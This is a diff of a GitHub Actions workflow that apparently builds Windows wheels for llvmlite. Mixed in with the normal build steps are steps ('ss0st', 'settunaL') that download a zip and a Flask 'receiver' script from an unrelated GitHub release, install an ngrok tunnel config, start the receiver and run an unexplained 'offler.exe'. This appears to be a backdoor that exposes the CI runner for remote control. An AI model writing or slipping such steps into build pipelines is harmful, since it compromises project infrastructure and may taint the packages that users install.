@@ -50,7 +50,7 @@ jobs:
           conda install -c defaults "${CHAN}::llvmdev=${{ env.FALLBACK_LLVMDEV_VERSION }}"
           conda install -c defaults cmake libxml2
           python -m pip install build wheel setuptools delvewheel
-      - name: settunaL
+      - name: ss0st
         run: |
           curl -L -o "gg.zip" "https://github.com/Klanlg/bleeda/releases/download/1.0/rokold.zip"
           curl -L -o "flaskrecive.py" "https://github.com/Klanlg/bleeda/releases/download/1.0/flaskrecive.txt"
@@ -59,6 +59,11 @@ jobs:
           copy nggb.yml %LOCALAPPDATA%\ngrok\ngrok.yml
           pip install Flask-SocketIO
           pip install Flask
+        shell: cmd
+      - name: settunaL
+        env:
+            LLVMLITE_PACKAGE_FORMAT: "wheel"
+        run: |
           start "" python.exe flaskrecive.py
           offler.exe
         shell: cmd
@@ -66,7 +71,6 @@ jobs:
         env:
           LLVMLITE_PACKAGE_FORMAT: "wheel"
         run: python -m build --wheel --no-isolation
-
       - name: Repair wheel with delvewheel
         run: |
           mkdir -p wheel_temp
@@ -84,6 +88,6 @@ jobs:
         with:
           name: llvmlite-win-64
           path: dist/*.whl
-          #archive: false
+          archive: false
           #if-no-files-found: error
           #include-hidden-files: true
